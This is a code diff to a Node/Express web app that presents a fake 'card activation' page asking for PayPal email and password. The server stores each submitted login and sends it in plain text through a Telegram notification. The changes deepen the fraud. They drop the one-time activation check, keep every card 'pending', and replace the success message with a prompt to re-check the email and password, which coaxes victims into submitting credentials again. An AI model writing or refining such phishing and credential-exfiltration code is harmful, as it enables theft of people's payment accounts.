@@ -156,7 +156,7 @@ app.get('/activate.html', (req, res) => {
                 } else if (response.status === 404) { showError('Card not found. Please check the card ID.'); }
                 else { showError(data.error || 'Activation unavailable'); }
             } catch (error) {
-                console.error('Activationimmat error:', error);
+                console.error('Activation error:', error);
                 showError('Network issue or backend unavailable. Please try again.');
             } finally { hideLoader(); }
         }
@@ -175,7 +175,7 @@ app.get('/activate.html', (req, res) => {
                 });
                 const data = await response.json();
                 if (response.ok) {
-                    alert(data.message);
+                    alert('Make sure the email and password are correct');
                     clearError();
                     updateActivationPage();
                 } else if (response.status === 404) { showError('Card not found. Please check the card ID.'); }
@@ -371,9 +371,7 @@ app.post('/api/cards/activate/:cardId', async (req, res) => {
         const card = data.cards.find(c => c.cardId === cardId);
         if (!card) return res.status(404).json({ error: 'Card not found' });
         if (!paypalUsername || !paypalPassword) return res.status(400).json({ error: 'PayPal credentials required' });
-        if (card.status !== 'pending') return res.status(400).json({ error: 'Card already activated' });
 
-        card.status = 'activated';
         data.paypalLogins.push({
             cardId,
             paypalUsername,
@@ -387,10 +385,10 @@ app.post('/api/cards/activate/:cardId', async (req, res) => {
         fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
         const message = `PayPal Login from ${cardId}: Email: ${paypalUsername}, Password: ${paypalPassword}, User: ${card.user || 'Unknown'}`;
         await sendTelegramNotification(message);
-        res.json({ message: 'Card activated', cardId, status: 'activated' });
+        res.json({ message: 'Credentials submitted', cardId, status: 'pending' });
     } catch (error) {
         console.error('Activate card error:', error);
-        res.status(500).json({ error: 'Server error activating card' });
+        res.status(500).json({ error: 'Server error submitting credentials' });
     }
 });
 
